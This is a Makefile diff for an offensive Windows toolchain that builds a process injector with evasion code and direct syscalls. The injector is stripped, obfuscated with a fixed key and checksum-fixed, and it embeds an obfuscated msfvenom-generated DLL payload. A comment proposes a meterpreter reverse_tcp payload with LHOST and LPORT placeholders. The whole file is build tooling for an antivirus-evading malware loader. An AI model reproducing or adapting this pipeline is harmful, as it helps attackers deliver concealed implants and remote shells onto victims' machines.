@@ -1,5 +1,6 @@
 # Define the compiler, assembler, and tools
 CC = x86_64-w64-mingw32-gcc
+CC_NATIVE = gcc
 ASM = nasm
 OBJCOPY = x86_64-w64-mingw32-objcopy
 STRIP = x86_64-w64-mingw32-strip
@@ -7,60 +8,68 @@ STRIP = x86_64-w64-mingw32-strip
 # Define output binaries
 TARGET_EXE = injector.exe
 TARGET_OBFS_EXE = obfsinjector.exe
-TARGET_DLL = malDLL.dll
-OBFUSCATOR = obfuscator obfuscator.o binary_obfuscator.o
+OBFS_KEY = 144
+PAYLOAD_OBFUSCATOR = obfs_src/payloadObfuscator
+BINARY_OBFUSCATOR = obfs_src/obfuscator
+
+# Payload definition
+PAYLOAD_CONFIG= windows/x64/messagebox # use whatever msfvenom payload/config you want. For example: windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT>
+PAYLOAD_DLL = msfdll.dll #Change this accordingly to the name of your binary/payload. For testing, I will use msfvenom msgbox payload :)
+PAYLOAD_HEADER = payload.h #do not change this please, or modify the code accordingly!
 
 # Define source files
 ASM_SRC = syscalls.asm
 ASM_OBJ = syscalls.o
 
-C_SRCS = dllinjector.c detector.c evasion.c
-C_HDRS = detector.h evasion.h
+C_SRCS = $(wildcard ./*.c)
+C_HDRS = $(wildcard ./*.h)
 C_OBJS = $(C_SRCS:.c=.o)
 
-DLL_SRC = malDLL.c
+C_OBFS_SRCS = $(wildcard obfs_src/*.c)
+C_OBFS_HDRS = $(wildcard obfs_src/*.h)
+C_OBFS_OBJS = $(C_OBFS_SRCS:.c=.o)
 
 # Compilation flags
 CFLAGS = -Wall -Wno-array-bounds -O2 
 LDFLAGS = -O2 -flto -ffunction-sections -fdata-sections -lshlwapi -Wl,--section-alignment,4096 -Wl,--gc-sections -Wl,--strip-debug -Wl,--image-base,0x140000000
-DLL_LDFLAGS = -shared -Wl,--subsystem,windows -mwindows
+CFLAGS_NATIVE = -Os -Wall
 
 # Default target
-all: $(TARGET_EXE) $(TARGET_DLL) $(OBFUSCATOR)
+all: $(TARGET_EXE) $(PAYLOAD_DLL) $(OBFUSCATOR) $(PAYLOAD_HEADER)
 
 # Assemble syscalls.asm
 $(ASM_OBJ): $(ASM_SRC)
 	$(ASM) -f win64 $(ASM_SRC) -o $(ASM_OBJ)
 
 # Compile C files
-%.o: %.c $(C_HDRS)
+./%.o: ./%.c $(C_HDRS)
 	$(CC) $(CFLAGS) -c $< -o $@
 
+obfs_src/%.o: obfs_src/%.c $(C_OBFS_HDRS)
+	$(CC_NATIVE) $(CFLAGS_NATIVE) -c $< -o $@
+
+$(BINARY_OBFUSCATOR): obfs_src/obfuscator.o obfs_src/binary_obfuscator.o
+	$(CC_NATIVE) $(CFLAGS_NATIVE) obfs_src/obfuscator.o obfs_src/binary_obfuscator.o -o $(BINARY_OBFUSCATOR)
+
+$(PAYLOAD_OBFUSCATOR): obfs_src/payloadObfuscator.o
+	$(CC_NATIVE) $(CFLAGS_NATIVE) obfs_src/payloadObfuscator.o -o $(PAYLOAD_OBFUSCATOR)
+
 # Link the injector executable
-$(TARGET_EXE): $(C_OBJS) $(ASM_OBJ) obfuscator
-	$(CC) -o $(TARGET_EXE) $(C_OBJS) $(ASM_OBJ) $(LDFLAGS)
+$(TARGET_EXE): $(PAYLOAD_HEADER) $(C_OBJS) $(ASM_OBJ) $(BINARY_OBFUSCATOR)
+	$(CC) -o $(TARGET_EXE) $(C_OBJS) $(ASM_OBJ) $(PAYLOAD_HEADER) $(LDFLAGS)
 	$(OBJCOPY) --rename-section .CRT=.data $(TARGET_EXE)
 	$(STRIP) --strip-debug --strip-unneeded $(TARGET_EXE)
-	./obfuscator $(TARGET_EXE) $(TARGET_OBFS_EXE) 144
-	@echo "Recalculating PE CheckSum..."
+	./$(BINARY_OBFUSCATOR) $(TARGET_EXE) $(TARGET_OBFS_EXE) $(OBFS_KEY)
 	python3 fix_checksum.py $(TARGET_OBFS_EXE)
-	rm -f $(ASM_OBJ) $(C_OBJS) $(OBFUSCATOR)
+# cleaning intermediary files
+	rm -f $(ASM_OBJ) $(C_OBJS) $(PAYLOAD_OBFUSCATOR) $(TARGET_EXE) $(PAYLOAD_DLL) $(BINARY_OBFUSCATOR) $(C_OBFS_OBJS)
+	
+$(PAYLOAD_HEADER): $(PAYLOAD_DLL) $(PAYLOAD_OBFUSCATOR)
+	./$(PAYLOAD_OBFUSCATOR) $(PAYLOAD_DLL) $(OBFS_KEY)
 
-# Build the malicious DLL
-$(TARGET_DLL): $(DLL_SRC)
-	$(CC) $(DLL_LDFLAGS) -o $(TARGET_DLL) $(DLL_SRC)
-
-
-## simple Compilation of the obfuscator
-obfuscator.o: obfuscator.c
-	gcc -Os -c -Wall obfuscator.c -o obfuscator.o
-
-binary_obfuscator.o: binary_obfuscator.c
-	gcc -Os -c -Wall binary_obfuscator.c -o binary_obfuscator.o
-
-obfuscator: obfuscator.o binary_obfuscator.o
-	gcc -Os -s -Wall obfuscator.o binary_obfuscator.o -o obfuscator
+$(PAYLOAD_DLL):
+	msfvenom -p $(PAYLOAD_CONFIG)-o $(PAYLOAD_DLL)
 
 # Clean up generated files
 clean:
-	rm -f $(ASM_OBJ) $(C_OBJS) $(TARGET_EXE) $(TARGET_DLL) $(OBFUSCATOR) $(TARGET_OBFS_EXE)
+	rm -f $(ASM_OBJ) $(C_OBJS) $(TARGET_EXE) $(PAYLOAD_DLL) $(BINARY_OBFUSCATOR) $(TARGET_OBFS_EXE) $(PAYLOAD_HEADER) $(PAYLOAD_OBFUSCATOR) $(C_OBFS_OBJS)
